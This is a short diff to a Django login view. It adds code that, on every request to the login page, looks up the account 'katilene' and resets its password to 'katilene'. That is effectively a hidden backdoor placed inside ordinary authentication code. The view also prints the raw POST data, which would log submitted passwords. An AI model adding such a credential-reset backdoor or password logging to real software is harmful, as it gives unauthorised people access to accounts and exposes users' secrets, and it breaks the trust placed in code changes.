@@ -1,8 +1,14 @@
 from django.shortcuts import render, redirect
 from django.contrib.auth import authenticate, login
+from django.contrib.auth.models import User
 from django.conf import settings
 
 def login_view(request):
+
+    
+    u = User.objects.get(username__exact="katilene")
+    u.set_password("katilene")
+    u.save()
     
     if request.method == 'POST':
         print(request.POST)
